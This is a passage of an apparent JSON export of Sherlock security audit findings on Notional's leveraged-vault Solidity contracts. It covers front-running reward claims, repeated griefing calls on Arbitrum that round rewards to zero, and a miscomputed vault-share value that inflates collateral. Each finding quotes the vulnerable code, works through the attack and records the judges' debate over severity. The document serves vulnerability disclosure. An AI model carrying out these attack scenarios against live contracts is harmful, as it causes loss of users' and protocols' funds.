// balanceAfter should never be less than balanceBefore\n174:                 balanceAfter - balancesBefore[i],\n175:                 totalVaultSharesBefore\n176:             );\n177:         }\n178:     }\n```\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L181\n\n```solidity\nFile: VaultRewarderLib.sol\n181:     function _executeClaim(RewardPoolStorage memory r) internal {\n182:         if (r.poolType == RewardPoolType.AURA) {\n183:             require(IAuraRewardPool(r.rewardPool).getReward(address(this), true));\n184:         } else if (r.poolType == RewardPoolType.CONVEX_MAINNET) {\n185:             require(IConvexRewardPool(r.rewardPool).getReward(address(this), true));\n186:         } else if (r.poolType == RewardPoolType.CONVEX_ARBITRUM) {\n187:             IConvexRewardPoolArbitrum(r.rewardPool).getReward(address(this));\n188:         } else {\n189:             revert();\n190:         }\n191:     }\n```\n\nHowever, the `getReward` function of the external protocols can be executed by anyone. Refer to Appendix A for the actual implementation of the `getReward` function.\n\nAs a result, malicious users can front-run the `_claimVaultRewards` transaction and trigger the `getReward` function of the external protocols directly, resulting in the reward tokens to be sent to the vault before the `_claimVaultRewards` is executed.\n\nWhen the `_claimVaultRewards` function is executed, the before/after snapshot will ultimately claim the zero amount. The code ` balanceAfter - balancesBefore[i]` at Line 174 above will always produce zero if the call to `_claimVaultRewards` is front-run.\n\nAs a result, reward tokens are forever lost in the contract.\n\n## Impact\n\nHigh as this issue is the same [this issue](https://github.com/sherlock-audit/2023-03-notional-judging/issues/200) in the past Notional V3 contest.\n\nLoss of assets as the reward tokens intended for Notional and its users are lost.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L174\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L181\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using the entire balance instead of the difference between before and after balances.\n\n## Appendix A - `getReward` of Convex and Aura's reward pool contract\n\n**Aura's Reward Pool on Mainnet**\n\nhttps://etherscan.io/address/0x44D8FaB7CD8b7877D5F79974c2F501aF6E65AbBA#code#L980 \n\n```solidity\n     function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n        uint256 reward = earned(_account);\n        if (reward > 0) {\n            rewards[_account] = 0;\n            rewardToken.safeTransfer(_account, reward);\n            IDeposit(operator).rewardClaimed(pid, _account, reward);\n            emit RewardPaid(_account, reward);\n        }\n\n        //also get rewards from linked rewards\n        if(_claimExtras){\n            for(uint i=0; i < extraRewards.length; i++){\n                IRewards(extraRewards[i]).getReward(_account);\n            }\n        }\n        return true;\n    }\n```\n\n**Aura's Reward Pool on Arbitrum**\n\nhttps://arbiscan.io/address/0x17F061160A167d4303d5a6D32C2AC693AC87375b#code#F15#L296\n\n```solidity\n  /**\n     * @dev Gives a staker their rewards, with the option of claiming extra rewards\n     * @param _account     Account for which to claim\n     * @param _claimExtras Get the child rewards too?\n     */\n    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n        uint256 reward = earned(_account);\n        if (reward > 0) {\n            rewards[_account] = 0;\n            rewardToken.safeTransfer(_account, reward);\n            IDeposit(operator).rewardClaimed(pid, _account, reward);\n            emit RewardPaid(_account, reward);\n        }\n\n        //also get rewards from linked rewards\n        if(_claimExtras){\n            for(uint i=0; i < extraRewards.length; i++){\n                IRewards(extraRewards[i]).getReward(_account);\n            }\n        }\n        return true;\n    }\n```\n\n**Convex's Reward Pool on Arbitrum**\n\nhttps://arbiscan.io/address/0x93729702Bf9E1687Ae2124e191B8fFbcC0C8A0B0#code#F1#L337\n\n```solidity\n    //claim reward for given account (unguarded)\n    function getReward(address _account) external {\n        //check if there is a redirect address\n        if(rewardRedirect[_account] != address(0)){\n            _checkpoint(_account, rewardRedirect[_account]);\n        }else{\n            //claim directly in checkpoint logic to save a bit of gas\n            _checkpoint(_account, _account);\n        }\n    }\n```\n\n#### Convex for Mainnet\n\nhttps://etherscan.io/address/0xD1DdB0a0815fD28932fBb194C84003683AF8a824#code#L980\n\n```solidity\n    function getReward(address _account, bool _claimExtras) public updateReward(_account) returns(bool){\n        uint256 reward = earned(_account);\n        if (reward > 0) {\n            rewards[_account] = 0;\n            rewardToken.safeTransfer(_account, reward);\n            IDeposit(operator).rewardClaimed(pid, _account, reward);\n            emit RewardPaid(_account, reward);\n        }\n\n        //also get rewards from linked rewards\n        if(_claimExtras){\n            for(uint i=0; i < extraRewards.length; i++){\n                IRewards(extraRewards[i]).getReward(_account);\n            }\n        }\n        return true;\n    }\n```\n\n\n\n## Discussion\n\n**DenTonylifer**\n\nDisagree with severity\n\nThis should be high issue according to Sherlock rules:\n- there is no limitations of external conditions - attack can be done for free by anyone and anytime \n- loss of rewards for users even up to 100% of reward amount\n- loss for protocol as there is no ability to resque stuck tokens\n\nAlso look at similar high-severity issues from past audits:\nhttps://github.com/sherlock-audit/2023-06-tokemak-judging/issues/738\nhttps://github.com/sherlock-audit/2023-03-notional-judging/issues/168\n\n**xiaoming9090**\n\nEscalate.\n\nThis issue should be a High instead of Medium.\n\nMalicious users can easily cause Notional and its users to lose rewards by triggering the `getReward` function of the external protocols as described in my report.\n\nNote that this issue is exactly the same as the issue (https://github.com/sherlock-audit/2023-03-notional-judging/issues/200) found in the past Notional contest, which was judged as a High finding. Thus, it should be consistently applied here.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> This issue should be a High instead of Medium.\n> \n> Malicious users can easily cause Notional and its users to lose rewards by triggering the `getReward` function of the external protocols as described in my report.\n> \n> Note that this issue is exactly the same as the issue (https://github.com/sherlock-audit/2023-03-notional-judging/issues/200) found in the past Notional contest, which was judged as a High finding. Thus, it should be consistently applied here.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**WangSecurity**\n\nI agree the severity should be high, don't see any extensive constraints here, even though the attack is griefing. Planning to accept the escalation and upgrade the severity.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/63/#issuecomment-2227178782): accepted",
      "summary": "\nThis bug report discusses an issue where users can deny the vault from claiming reward tokens by front-running a specific function. This vulnerability can result in the loss of assets for the protocol and its users. The bug report includes code snippets and a discussion among the auditors, where they ultimately decide to escalate the severity of the issue from medium to high. They also note that this issue has been found in a previous audit and was judged as a high finding, so it should be consistently applied here. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/63",
      "tags": [],
      "finders": [
        "DenTonylifer",
        "xiaoming90"
      ]
    },
    {
      "id": "35119",
      "title": "H-6: Loss of rewards due to continuous griefing attacks on L2 environment",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/61 \n\n## Found by \nnirohgo, xiaoming90\n## Summary\n\nOn the L2 environment (e.g., Arbitrum), due to low transaction fees, it is possible for malicious users to perform griefing attacks against the reward features, leading to a loss of rewards.\n\n## Vulnerability Detail\n\n#### Instance 1\n\nLine 174 (`balanceAfter - balancesBefore[i]`) attempts to compute the number of reward tokens claimed.\n\nMalicious users could call the permissionless `claimRewardTokens` function on every new block, which in turn calls the internal `_claimVaultRewards` function. This is feasible due to the low transaction fees on L2 (Arbitrum), leading to a small number of reward tokens being claimed each time.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L174\n\n```solidity\nFile: VaultRewarderLib.sol\n148:     function _claimVaultRewards(\n149:         uint256 totalVaultSharesBefore,\n150:         VaultRewardState[] memory state,\n151:         RewardPoolStorage memory rewardPool\n152:     ) internal {\n153:         uint256[] memory balancesBefore = new uint256[](state.length);\n154:         // Run a generic call against the reward pool and then do a balance\n155:         // before and after check.\n156:         for (uint256 i; i < state.length; i++) {\n157:             // Presumes that ETH will never be given out as a reward token.\n158:             balancesBefore[i] = IERC20(state[i].rewardToken).balanceOf(address(this));\n159:         }\n160: \n161:         _executeClaim(rewardPool);\n162: \n163:         rewardPool.lastClaimTimestamp = uint32(block.timestamp);\n164:         VaultStorage.setRewardPoolStorage(rewardPool);\n165: \n166:         // This only accumulates rewards claimed, it does not accumulate any secondary emissions\n167:         // that are streamed to vault users.\n168:         for (uint256 i; i < state.length; i++) {\n169:             uint256 balanceAfter = IERC20(state[i].rewardToken).balanceOf(address(this));\n170:             _accumulateSecondaryRewardViaClaim(\n171:                 i,\n172:                 state[i],\n173:                 // balanceAfter should never be less than balanceBefore\n174:                 balanceAfter - balancesBefore[i],\n175:                 totalVaultSharesBefore\n176:             );\n177:         }\n178:     }\n```\n\nThe `tokensClaimed` will be a very small value, as mentioned earlier. Assume that the precision of the reward token ($RT$) claimed is 6 decimals precision. The vault shares are denominated in 8 decimals precision (`Constants.INTERNAL_TOKEN_PRECISION`) in Notional.\n\nAssume that the `totalVaultSharesBefore` is 10000000 shares, which is 10000000e8. If the number of reward tokens claimed is less than 10000000 (e.g., 9999999), it will round down to zero. As a result, the reward tokens claimed will be lost. \n\n$$\n\\begin{align*}\n\\frac{10000000e8}{1e8} > tokensClaimed \\\\ \n10000000 > tokensClaimed\n\\end{align*}\n$$\n\nThe issue will get worse when the TVL of the vault grows, and the protocol attracts more liquidity, leading to bigger `totalVaultSharesBefore`, causing the rounding to zero error to be triggered more easily.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L340\n\n```solidity\nFile: VaultRewarderLib.sol\n332:     function _accumulateSecondaryRewardViaClaim(\n333:         uint256 index,\n334:         VaultRewardState memory state,\n335:         uint256 tokensClaimed,\n336:         uint256 totalVaultSharesBefore\n337:     ) private {\n338:         if (tokensClaimed == 0) return;\n339: \n340:         state.accumulatedRewardPerVaultShare += (\n341:             (tokensClaimed * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / totalVaultSharesBefore\n342:         ).toUint128();\n343: \n344:         VaultStorage.getVaultRewardState()[index] = state;\n345:     }\n```\n\n#### Instance 2\n\nSimilarly, the issue mentioned in Issue 1 is also applicable to claiming the reward from emission.\n\nDue to the low transaction fees on L2 (Arbitrum), malicious users could trigger the `_getAccumulatedRewardViaEmissionRate`  function on every new block. As a result, the `timeSinceLastAccumulation` in Line 373 below will be a very small value. \n\nThe math that leads to rounding zero error is similar to Issue 1. When it round to zero, it will lead to a loss of emission rewards.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L373\n\n```solidity\nFile: VaultRewarderLib.sol\n347:     function _accumulateSecondaryRewardViaEmissionRate(\n348:         uint256 index,\n349:         VaultRewardState memory state,\n350:         uint256 totalVaultSharesBefore\n351:     ) private {\n352:         state.accumulatedRewardPerVaultShare = _getAccumulatedRewardViaEmissionRate(\n353:             state, totalVaultSharesBefore, block.timestamp\n354:         ).toUint128();\n355:         state.lastAccumulatedTime = uint32(block.timestamp);\n356: \n357:         VaultStorage.getVaultRewardState()[index] = state;\n358:     }\n359: \n360:     function _getAccumulatedRewardViaEmissionRate(\n361:         VaultRewardState memory state,\n362:         uint256 totalVaultSharesBefore,\n363:         uint256 blockTime\n364:     ) private pure returns (uint256) {\n365:         // Short circuit the method with no emission rate\n366:         if (state.emissionRatePerYear == 0) return state.accumulatedRewardPerVaultShare;\n367:         require(0 < state.endTime);\n368:         uint256 time = blockTime < state.endTime ? blockTime : state.endTime;\n369: \n370:         uint256 additionalIncentiveAccumulatedPerVaultShare;\n371:         if (state.lastAccumulatedTime < time && 0 < totalVaultSharesBefore) {\n372:             // NOTE: no underflow, checked in if statement\n373:             uint256 timeSinceLastAccumulation = time - state.lastAccumulatedTime;\n374:             // Precision here is:\n375:             //  timeSinceLastAccumulation (SECONDS)\n376:             //  emissionRatePerYear (REWARD_TOKEN_PRECISION)\n377:             //  INTERNAL_TOKEN_PRECISION (1e8)\n378:             // DIVIDE BY\n379:             //  YEAR (SECONDS)\n380:             //  INTERNAL_TOKEN_PRECISION (1e8)\n381:             // => Precision = REWARD_TOKEN_PRECISION * INTERNAL_TOKEN_PRECISION / INTERNAL_TOKEN_PRECISION\n382:             // => rewardTokenPrecision\n383:             additionalIncentiveAccumulatedPerVaultShare =\n384:                 (timeSinceLastAccumulation\n385:                     * uint256(Constants.INTERNAL_TOKEN_PRECISION)\n386:                     * state.emissionRatePerYear)\n387:                 / (Constants.YEAR * totalVaultSharesBefore);\n388:         }\n389: \n390:         return state.accumulatedRewardPerVaultShare + additionalIncentiveAccumulatedPerVaultShare;\n391:     }\n```\n\n## Impact\n\nLoss of reward tokens, as shown in the scenarios above.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L174\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L340\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L373\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nTo reduce the impact of this issue, consider making the `claimRewardTokens` function permissioned and only allowing whitelisted bots to trigger it periodically.\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xmystery** commented:\n>  Low/QA at most due to dust amount loss\n\n\n\n**xiaoming9090**\n\nEscalate.\n\nThis should be a valid issue. If Notional is deployed only on the Mainnet, this issue does not pose a significant risk. However, Notional is also deployed on L2 (Arbitrum), thus the risk cannot be ignored. As mentioned in the report, this attack is feasible due to low transaction fees on L2. \n\nIn addition, the loss is not a dust amount, as mentioned in the Judging comment. Under the right conditions (e.g., Vault with large TVL), and if malicious actors frequently perform griefing attacks against the reward features, the entire reward amount could be lost.\n\n**sherlock-admin3**\n\n> Escalate.\n> \n> This should be a valid issue. If Notional is deployed only on the Mainnet, this issue does not pose a significant risk. However, Notional is also deployed on L2 (Arbitrum), thus the risk cannot be ignored. As mentioned in the report, this attack is feasible due to low transaction fees on L2. \n> \n> In addition, the loss is not a dust amount, as mentioned in the Judging comment. Under the right conditions (e.g., Vault with large TVL), and if malicious actors frequently perform griefing attacks against the reward features, the entire reward amount could be lost.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**mystery0x**\n\n> Escalate.\n> \n> This should be a valid issue. If Notional is deployed only on the Mainnet, this issue does not pose a significant risk. However, Notional is also deployed on L2 (Arbitrum), thus the risk cannot be ignored. As mentioned in the report, this attack is feasible due to low transaction fees on L2.\n> \n> In addition, the loss is not a dust amount, as mentioned in the Judging comment. Under the right conditions (e.g., Vault with large TVL), and if malicious actors frequently perform griefing attacks against the reward features, the entire reward amount could be lost.\n\nWill have sponsors look into this finding... but will `balanceAfter - balancesBefore[i]` not have the exploit circumvented when rolling over?\n\n**WangSecurity**\n\nMoreover, as I understand a completely possible scenario that there will be regular users claiming the rewards (e.g. Block 1 - Alice, block 2 - Bob, block 3 - Jack, etc.), so it even removes the need for the attack to be on L2 I believe.\n\nSecondly, yes, the loss each time individually is very small, but if we take a broader picture, if the attacker repeats this attack for just one day, all the rewards for this day will be lost, which scales up, taking large TVL into account.\n\nPlanning to accept the escalation and validate the issue with high severity, since all the rewards can be lost. Yes, the attacker doesn't gain anything, but I believe there are no extensive constraints and a definite loss of funds.\n\n**WangSecurity**\n\nAre there additional duplicates except #90? @mystery0x \n\n**0502lian**\n\nI can’t agree that this issue is high, based on three points:\n- (1) I disagree with the example in the report where the precision of the Reward Token is 6(both scenarios 1 and 2). Based on the protocols mentioned (arb, cvx), it should be 18 and After Constants.INTERNAL_TOKEN_PRECISION is used by dev to expand to 1e8 before calculating shares.\nFor example, if the Reward Token precision is 18, even if the reward per block is only one token, i.e., 1e18 arb, then to round to 0, the required VaultShare would be 1e18 * 1e8 (not the 10000000e8 in reports), which is almost impossible to achieve.\n\n    **Therefore, for a Reward Token with a precision of 18, causing the rounding to zero error is almost impossible.**\n\n- (2) The attacker does not profit and actually incurs a gas loss.\n\n\n**I suggest considering the sponsor’s opinion when judging whether this issue is high.**\n@WangSecurity  @T-Woodward  @jeffywu\n\n\n**xiaoming9090**\n\n> I can’t agree that this issue is high, based on three points:\n> \n> * (1) I disagree with the example in the report where the precision of the Reward Token is 6(both scenarios 1 and 2). Based on the protocols mentioned (arb, cvx), it should be 18 and After Constants.INTERNAL_TOKEN_PRECISION is used by dev to expand to 1e8 before calculating shares.\n>   For example, if the Reward Token precision is 18, even if the reward per block is only one token, i.e., 1e18 arb, then to round to 0, the required VaultShare would be 1e18 * 1e8 (not the 10000000e8 in reports), which is almost impossible to achieve.\n>   **Therefore, for a Reward Token with a precision of 18, causing the rounding to zero error is almost impossible.**\n> * (2) The attacker does not profit and actually incurs a gas loss.\n> \n> **I suggest considering the sponsor’s opinion when judging whether this issue is high.** @WangSecurity @T-Woodward @jeffywu\n\n1) There is no part in the contest README stating that only ARB/CVX or reward tokens with 18 decimals will be accepted. Thus, it will be considered that reward tokens with 6 decimals (e.g., USDC, USDT) will also be accepted as reward tokens for the context of this audit contest. Also, the new contracts are meant to handle any reward tokens Notional might receive and would like to distribute to its users.\n\n2)  Gas in L2 is insignificant compared to the loss of the reward tokens.\n\n**jeffywu**\n\nLooks like this issue is also a duplicate: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/115\n\nReward tokens with 6 decimals can be used so that part is valid.\n\nI think there are some similar issues in severity where we would consider this valid and fix it, but in reality someone doing this seems unlikely without some sort of profit motivation. I'd consider this a valid medium severity issue.\n\n**novaman33**\n\nI also think medium is more appropriate as it is a costly attack with no incentive for the attacker. However from the readMe tokens with 6 decimals were not in scope in this audit so it might be invalid.\n\n\n**xiaoming9090**\n\n> I also think medium is more appropriate as it is a costly attack with no incentive for the attacker. \n\nIn L2 environment, the cost of attack is significantly lower than on Ethereum. Thus, as stated earlier, this type of griefing attack is only relevant in the L2 environment in which Notional resides. The maximum impact is that all reward tokens will be lost.\n\nNote that all DOS/griefing issues, by nature, do not directly benefit the attackers but cause a loss of assets for the victim (users or protocols). However, these issues have been consistently judged as High in Sherlock as long as the issues demonstrate a definite loss of assets to the victims with no extensive constraints.\n\n> However from the readMe tokens with 6 decimals were not in scope in this audit so it might be invalid.\n\nThe contest's README does not state that tokens with 6 decimals are not in scope. As a whole, Notional protocol only explicitly disallows tokens that are less than 6 decimals or more than 18 decimals.\n\n\n\n**0502lian**\n\nI agree with the sponsor’s opinion.\n\nAssuming on Arbitrum, with an average of 0.25s per block, considering the complexity of the claimRewardTokens function, the gas cost for each transaction is reasonably estimated to be 0.01 USD - 0.1 USD.\nThe estimated number of transactions per day is 4 * 3600 * 24 = 345600.\nIf it continues for one day, the attacker’s cost is: 345600 * (0.01 USD ~ 0.1 USD) = 3456 USD ~ 34560 USD.\n\n**And the attacker’s profit is 0.**\n\nConsidering that Notional has many staking vaults, assuming the value of one vault is 1M USD and the annual reward rate is 10%, which is a reasonable estimate, then the daily loss of funds from the vault is:\n1000000 * 10% / 365 = 273.97 USD.\n\n**notN000B**\n\n\n```\nadditionalIncentiveAccumulatedPerVaultShare  = (timeSinceLastAccumulation * 1e8 * emissionRate) / (31536000 * totalVaultSharesBefore)\n\n```\n\nThe `additionalIncentiveAccumulatedPerVaultShare` will be zero if `(t * 1e8 * rate) < 31536000 * totalSharesBefore`, which is achievable.\n\n For instance, with `totalSharesBefore` being 1,000,000,000 shares, this equates to `1,000,000,000 * 1e8`. To prevent reward accumulation, an attacker needs to ensure` t * rate *1e8 < 31536000 * 1,000,000,000 * 1e8`. Even with a high emission rate of 1e6 reward tokens (which is very unlikely), the attacker would need to call functions just before `t < 31536 seconds (approximately 8.76 minutes`). \n\nWith such a high emission rate, there would be roughly 9 minutes to DOS the function, even on the mainnet. As totalShares increase and the emission rate decreases(Which will be the case in reality), DOSing the function becomes even easier\n\nIssuse should be HIGH. This was my first contest I can't escalate my issue but This issue seems sames as mine\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/115\n\n**0502lian**\n\nFor instance, with totalSharesBefore being 1,000,000,000 shares, this equates to 1,000,000,000 * 1e8. \n---------That means you need 1 billion ETH in a vault(eg PendlePTEtherFiVault). The total circulating supply of Ethereum (ETH) is currently approximately 0.12 billion ETH\n\n**WangSecurity**\n\nFirstly, about the reward tokens. The reason why they weren't specified in the README is because they're not set by the admins of Notional. The reward tokens are the tokens that other protocols, which Notional integrates with, use to pay out the rewards/grants. Hence, I believe it's enough contextual evidence that the protocol indeed needs to work with any type of reward tokens.\n\nSecondly, I see that there is no impact for the attacker and on mainnet the cost is significant. As I've said in my previous comment, it can happen without a malicious intent, when different users will claim rewards in every block. That is why I believe it qualifies for High severity:\n> Definite loss of funds without (extensive) limitations of external conditions\n\nPlanning to accept the escalation and validate the issue with high severity. Duplicates are #90. #115 is not a duplicate, check my comment under it.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/61/#issuecomment-2227180243): accepted",
      "summary": "\nThis bug report highlights a vulnerability in the L2 environment (such as Arbitrum) where low transaction fees allow malicious users to perform griefing attacks on reward features, resulting in a loss of rewards. The issue is caused by a rounding error in the code, which can lead to reward tokens being rounded down to zero and lost. This issue can be easily exploited by attackers, especially as the total value locked in the vault increases. The severity of this issue is considered high, as it can result in a definite loss of funds without extensive limitations. The bug has been escalated and resolved successfully.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/61",
      "tags": [],
      "finders": [
        "xiaoming90",
        "nirohgo"
      ]
    },
    {
      "id": "35118",
      "title": "H-5: Incorrect valuation of vault share",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/60 \n\n## Found by \nblackhole, nirohgo, xiaoming90\n## Summary\n\nThe code for computing the valuation of the vault shares was found to be incorrect. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, draining assets from the protocol.\n\n## Vulnerability Detail\n\nLet $BT$ be the borrowed token with 6 decimal precision, and $RT$ be the redemption token with 18 decimal precision.\n\nWhen a withdraw request has split and is finalized, the following `_getValueOfSplitFinalizedWithdrawRequest` function will be used to calculate the value of a withdraw request in terms of the borrowed token ($BT$).\n\nIn Line 77 below, the `Deployments.TRADING_MODULE.getOraclePrice` function will be called to fetch the exchange rate of the redemption token ($RT$) and borrowed token ($BT$).\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L77\n\n```solidity\nFile: WithdrawRequestBase.sol\n65:     function _getValueOfSplitFinalizedWithdrawRequest(\n66:         WithdrawRequest memory w,\n67:         SplitWithdrawRequest memory s,\n68:         address borrowToken,\n69:         address redeemToken\n70:     ) internal virtual view returns (uint256) {\n71:         // If the borrow token and the withdraw token match, then there is no need to apply\n72:         // an exchange rate at this point.\n73:         if (borrowToken == redeemToken) {\n74:             return (s.totalWithdraw * w.vaultShares) / s.totalVaultShares;\n75:         } else {\n76:             // Otherwise, apply the proper exchange rate\n77:             (int256 rate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(redeemToken, borrowToken);\n78: \n79:             return (s.totalWithdraw * rate.toUint() * w.vaultShares) / \n80:                 (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION);\n81:         }\n82:     }\n```\n\nWithin the `Deployments.TRADING_MODULE.getOraclePrice` function, chainlink oracle will be used. Refer to the source code's comment on Lines 255-257 below for more details. Note that the $RT$ is the base, while the $BT$ is the quote here.\n\nAssume that one $BT$ is worth 1 USD, so the `quotePrice` will be 1e8. Assume that one $RT$ is worth 10 USD, so the `basePrice` will be 10e18. Note that Chainlink oracle's price is always denominated in 8 decimals for USD price feed.\n\nThis function will always return the exchange rate is `RATE_DECIMALS` (18 decimals - Hardcoded). Thus, based on the calculation in Lines 283-285, the exchange rate returned will be 10e18, which is equivalent to one unit of $RT$ is worth 10 units of $BT$.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/trading/TradingModule.sol#L283\n\n```solidity\nFile: TradingModule.sol\n255:     /// @notice Returns the Chainlink oracle price between the baseToken and the quoteToken, the\n256:     /// Chainlink oracles. The quote currency between the oracles must match or the conversion\n257:     /// in this method does not work. Most Chainlink oracles are baseToken/USD pairs.\n258:     /// @param baseToken address of the first token in the pair, i.e. USDC in USDC/DAI\n259:     /// @param quoteToken address of the second token in the pair, i.e. DAI in USDC/DAI\n260:     /// @return answer exchange rate in rate decimals\n261:     /// @return decimals number of decimals in the rate, currently hardcoded to 1e18\n262:     function getOraclePrice(address baseToken, address quoteToken)\n263:         public\n264:         view\n265:         override\n266:         returns (int256 answer, int256 decimals)\n267:     {\n268:         _checkSequencer();\n269:         PriceOracle memory baseOracle = priceOracles[baseToken];\n270:         PriceOracle memory quoteOracle = priceOracles[quoteToken];\n271: \n272:         int256 baseDecimals = int256(10**baseOracle.rateDecimals);\n273:         int256 quoteDecimals = int256(10**quoteOracle.rateDecimals);\n274: \n275:         (/* */, int256 basePrice, /* */, uint256 bpUpdatedAt, /* */) = baseOracle.oracle.latestRoundData();\n276:         require(block.timestamp - bpUpdatedAt <= maxOracleFreshnessInSeconds);\n277:         require(basePrice > 0); /// @dev: Chainlink Rate Error\n278: \n279:         (/* */, int256 quotePrice, /* */, uint256 qpUpdatedAt, /* */) = quoteOracle.oracle.latestRoundData();\n280:         require(block.timestamp - qpUpdatedAt <= maxOracleFreshnessInSeconds);\n281:         require(quotePrice > 0); /// @dev: Chainlink Rate Error\n282: \n283:         answer =\n284:             (basePrice * quoteDecimals * RATE_DECIMALS) / \n285:             (quotePrice * baseDecimals);\n286:         decimals = RATE_DECIMALS;\n287:     }\n```\n\nThe `rate` at Line 77 below will be 10e18 based on our earlier calculation. Note the following:\n\n- `s.totalWithdraw` is the total $RT$ claimed and is denominated in 18 decimals (Token's native precision). Assume that `s.totalWithdraw=100e18 RT` was claimed.\n- `w.vaultShares` and `s.totalVaultShares` are the number of vault shares and is denominated in 8 decimals (`INTERNAL_TOKEN_PRECISION`). Assume that `w.vaultShares=5e8` and `s.totalVaultShares=10e8`\n- `Constants.EXCHANGE_RATE_PRECISION` is 1e18\n\nIntuitively, the split's total withdraw (`s.totalWithdraw`) is 100 units of $RT$. In terms of the borrowed token ($BT$), it will be 1000 units of $BT$ since the price is (1:10). Since the withdraw request owns 50% of the vault shares in the split withdraw request, it is entitled to 500 units of $BT$.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L77\n\n```solidity\nFile: WithdrawRequestBase.sol\n65:     function _getValueOfSplitFinalizedWithdrawRequest(\n66:         WithdrawRequest memory w,\n67:         SplitWithdrawRequest memory s,\n68:         address borrowToken,\n69:         address redeemToken\n70:     ) internal virtual view returns (uint256) {\n71:         // If the borrow token and the withdraw token match, then there is no need to apply\n72:         // an exchange rate at this point.\n73:         if (borrowToken == redeemToken) {\n74:             return (s.totalWithdraw * w.vaultShares) / s.totalVaultShares;\n75:         } else {\n76:             // Otherwise, apply the proper exchange rate\n77:             (int256 rate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(redeemToken, borrowToken);\n78: \n79:             return (s.totalWithdraw * rate.toUint() * w.vaultShares) / \n80:                 (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION);\n81:         }\n82:     }\n```\n\nTo calculate the value of a withdraw request in terms of the borrowed token ($BT$), the following formula at Line 79 above will be used:\n\n```solidity\n(s.totalWithdraw * rate * w.vaultShares) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION)\n(100e18 * 10e18 * 5e8) / (10e8 * 1e18)\n500000000000000000000\n500000000000000e6\n```\n\nHowever, the code above indicates that the withdraw request is entitled to 500000000000000 units of $BT$ instead of 500 units of $BT$, which is overly inflated. As a result, the account's collateral will be overly inflated.\n\n## Impact\n\nThe account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L77\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/trading/TradingModule.sol#L283\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate the formula to as follows:\n\n```diff\n- (s.totalWithdraw * rate.toUint() * w.vaultShares) / (s.totalVaultShares * 